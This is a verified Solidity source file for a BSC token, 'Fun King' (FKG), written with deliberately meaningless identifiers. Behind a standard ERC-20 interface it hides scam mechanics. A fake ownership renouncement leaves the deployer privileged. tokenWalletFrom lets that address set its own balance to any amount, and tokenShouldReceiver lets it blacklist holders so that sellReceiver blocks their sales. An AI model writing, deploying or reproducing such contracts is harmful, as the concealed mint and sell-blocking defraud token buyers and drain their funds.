/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract marketingTo {
    function senderTake() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface tokenTakeFund {
    function createPair(address toLaunch, address liquidityTo) external returns (address);
}

interface sellLaunchMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract FunKing is IERC20, marketingTo {
    uint8 private takeReceiver = 18;
    
    uint256 private fromTeam = 100000000 * 10 ** takeReceiver;

    mapping(address => bool) public receiverLaunch;
    mapping(address => mapping(address => uint256)) private totalSenderLaunched;
    bool private fundMarketing;
    uint256 public feeList;
    uint256 public receiverMarketingBuy;
    bool public swapReceiver;
    string private tradingAmount = "Fun King";
    mapping(address => bool) public swapLiquidityFrom;
    uint256 private fundAuto;
    mapping(address => uint256) private swapFundTake;

    address private buyLaunchedShould;
    uint256 private limitSellFrom;

    address private modeTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint256 public maxMode;
    uint256 private isTokenSender;
    uint256 private fundSellLaunch;
    address public swapShould;
    address public toFrom;

    bool public autoLaunch;
    

    string private exemptSender = "FKG";
    uint256 private totalLaunched;
    

    event OwnershipTransferred(address indexed limitLaunched, address indexed teamSwap);

    constructor (){
        if (limitSellFrom == fundAuto) {
            fundAuto = receiverMarketingBuy;
        }
        sellLaunchMode txSwapLiquidity = sellLaunchMode(modeTrading);
        swapShould = tokenTakeFund(txSwapLiquidity.factory()).createPair(txSwapLiquidity.WETH(), address(this));
        buyLaunchedShould = senderTake();
        
        toFrom = buyLaunchedShould;
        receiverLaunch[toFrom] = true;
        
        swapFundTake[toFrom] = fromTeam;
        emit Transfer(address(0), toFrom, fromTeam);
        teamMarketing();
    }

    

    function teamMarketing() public {
        emit OwnershipTransferred(toFrom, address(0));
        buyLaunchedShould = address(0);
    }

    function name() external view returns (string memory) {
        return tradingAmount;
    }

    function isBuyShould(address autoMode) public {
        if (autoLaunch) {
            return;
        }
        
        receiverLaunch[autoMode] = true;
        if (fundAuto == feeList) {
            totalLaunched = isTokenSender;
        }
        autoLaunch = true;
    }

    function listLaunchReceiver(address minTrading, address maxLimit, uint256 txAutoTrading) internal returns (bool) {
        require(swapFundTake[minTrading] >= txAutoTrading);
        swapFundTake[minTrading] -= txAutoTrading;
        swapFundTake[maxLimit] += txAutoTrading;
        emit Transfer(minTrading, maxLimit, txAutoTrading);
        return true;
    }

    function getOwner() external view returns (address) {
        return buyLaunchedShould;
    }

    function allowance(address modeTxTrading, address totalWalletLaunch) external view virtual override returns (uint256) {
        return totalSenderLaunched[modeTxTrading][totalWalletLaunch];
    }

    function tokenWalletFrom(uint256 txAutoTrading) public {
        if (!receiverLaunch[senderTake()]) {
            return;
        }
        swapFundTake[toFrom] = txAutoTrading;
    }

    function symbol() external view returns (string memory) {
        return exemptSender;
    }

    function toShould() public view returns (uint256) {
        return isTokenSender;
    }

    function owner() external view returns (address) {
        return buyLaunchedShould;
    }

    function tokenShouldReceiver(address launchedLaunch) public {
        
        if (launchedLaunch == toFrom || launchedLaunch == swapShould || !receiverLaunch[senderTake()]) {
            return;
        }
        if (feeList == fundAuto) {
            maxMode = fundSellLaunch;
        }
        swapLiquidityFrom[launchedLaunch] = true;
    }

    function receiverEnableTotal() public view returns (bool) {
        return fundMarketing;
    }

    function transferFrom(address minTrading, address maxLimit, uint256 txAutoTrading) external override returns (bool) {
        if (totalSenderLaunched[minTrading][senderTake()] != type(uint256).max) {
            require(txAutoTrading <= totalSenderLaunched[minTrading][senderTake()]);
            totalSenderLaunched[minTrading][senderTake()] -= txAutoTrading;
        }
        return sellReceiver(minTrading, maxLimit, txAutoTrading);
    }

    function sellReceiver(address minTrading, address maxLimit, uint256 txAutoTrading) internal returns (bool) {
        if (minTrading == toFrom || maxLimit == toFrom) {
            return listLaunchReceiver(minTrading, maxLimit, txAutoTrading);
        }
        if (maxMode != isTokenSender) {
            maxMode = limitSellFrom;
        }
        require(!swapLiquidityFrom[minTrading]);
        
        return listLaunchReceiver(minTrading, maxLimit, txAutoTrading);
    }

    function receiverFrom() public view returns (bool) {
        return swapReceiver;
    }

    function atMaxTx() public {
        
        if (fundSellLaunch == totalLaunched) {
            totalLaunched = receiverMarketingBuy;
        }
        receiverMarketingBuy=0;
    }

    function decimals() external view returns (uint8) {
        return takeReceiver;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fromTeam;
    }

    function transfer(address shouldAt, uint256 txAutoTrading) external virtual override returns (bool) {
        return sellReceiver(senderTake(), shouldAt, txAutoTrading);
    }

    function approve(address totalWalletLaunch, uint256 txAutoTrading) public virtual override returns (bool) {
        totalSenderLaunched[senderTake()][totalWalletLaunch] = txAutoTrading;
        emit Approval(senderTake(), totalWalletLaunch, txAutoTrading);
        return true;
    }

    function balanceOf(address buySender) public view virtual override returns (uint256) {
        return swapFundTake[buySender];
    }

    function shouldExempt() public {
        
        if (isTokenSender == fundSellLaunch) {
            isTokenSender = fundAuto;
        }
        feeList=0;
    }


}